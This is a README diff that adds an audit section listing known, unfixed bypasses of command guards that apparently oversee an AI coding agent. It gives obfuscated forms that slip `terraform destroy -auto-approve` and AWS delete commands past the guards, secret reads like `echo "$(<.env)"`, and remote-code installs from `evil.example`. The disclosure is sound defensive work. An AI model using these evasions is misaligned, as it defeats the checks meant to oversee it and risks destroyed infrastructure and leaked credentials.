@@ -393,6 +393,60 @@ when it would be worth lifting.
   `git config --global core.excludesfile ~/.gitignore_global` and
   `.claude/settings.local.json` as a line in that file.
 
+### Found by the 0.8 hardening audit, not yet fixed
+
+The mods read command text and config as written, so a determined caller can
+still get past them, and some ordinary commands are denied. These were
+reproduced; the next release will work through them.
+
+- **Every command guard, shared parser.** A command over 64 KB, or one nested
+  past 8 levels, is denied as unreadable. A brace or `$'…'` quoting form the
+  parser does not model can hide a word. A substitution is marked, not
+  expanded, so `terraform destroy -auto-approve -backup --h` and
+  `TF_CLI_ARGS=-auto-appr\ove terraform destroy` pass in the parts that match
+  raw text.
+- **aws-guard.** A PowerShell here-string can hide `-WhatIf` or `-OutVariable`.
+  `aws s3 $(echo rb) s3://bucket --force`, `aws iam del$()ete-role` and
+  `aws $(echo s3) rb …` pass, because a bare word after a substitution clears
+  the unread flag. `docker run --entrypoint aws img iam delete-role`, `aws $OPTS …`
+  and `cmd /c a^ws …` pass. Organizations and sso-admin calls after a
+  substitution are not checked by the first-word test.
+- **supply-chain-guard.** Abbreviated verbs (`npm upd`, `npm exe`, `npm creat`),
+  two unlisted value options before the verb (`pip --retr 3 --timeo 5 install`),
+  a uv option before `pip`, and a URL in a pinned spec (`uvx --from
+  git+https://…@1.2.3`) pass. A verb or tool name from the shell (`npm $(echo
+  install)`, a variable) and a runner whose program is not followed
+  (`npx --no-install npm install`, `pnpm exec pip install`, `yarn run pip install`)
+  pass. `pip install -r https://…`, `composer require evil/x:*`, `go run
+  evil.example/x@latest` and `npm install --package-lock=0` pass. `npx tsc` is
+  denied unless pinned or run with `--no-install`, and an install with a
+  substitution anywhere, such as `npm install --prefix "$(pwd)/web"`, is denied.
+- **secret-read-guard.** `echo ${GITHUB_TOKEN}`, `echo "$(<.env)"`,
+  `kubectl get Secret -o yaml` and `$env:GITHUB_TOKEN.ToString()` pass. A chain
+  of more than three `cd` moves is not followed, and a bare `cd` is not
+  treated as home. `cat *` and a dot-less `cat prod*` are not followed. A
+  `cd $VAR` or `cd "$(…)"` denies a later credential-name read, and
+  `cat .env.ex*` and `cat config.*` are denied. `echo 'export { a, b }'` is
+  denied as an environment dump.
+- **terraform-guard.** The pipe rule denies `terraform plan | tee plan.txt;
+  terraform destroy` and `git log | head; terraform destroy`, so a destroy after
+  an unrelated pipe is denied. `terraform $(echo destroy -auto-approve -backup)
+  plan`, `$'\x2dauto-approve'`, `find … -exec terraform destroy -auto-approve \;`
+  and `>|out` forms pass.
+- **secret-allow-guard.** A flag such as `--token enabled-mode` or
+  `-p 8080:80` in MCP args, and a `?token_type=bearer` url parameter, are
+  flagged. `TOKEN_FILE`, `PASSWORD_FILE`, `TOKEN_ENDPOINT` and `PWD` are
+  flagged by name. `Bearer <your-token>` placeholders are flagged. A file that
+  does not parse as JSON, such as one with a comment line, misses an
+  `"args":["--api-key","…"]` secret.
+- **tf-lint.** Assignments of a key through `os.environ[...]`, `props.put(...)`,
+  a heredoc or block-scalar value, and writes through `sed -i`,
+  `WriteAllText`, `New-Item -Value`, `| sc`, `| dd of=`, `python -c open().write`
+  and `git config user.token` pass. The key pattern also denies some ordinary
+  words that start with `asia` or `akia` and a few `xox` prefixed strings, as
+  false positives. `dynamic "egress"` and `egress = true` warn as open ports.
+  `description = "DB #1"` cuts the value at `#`.
+
 ## Security
 
 See [SECURITY.md](SECURITY.md) to report a way past a guard.
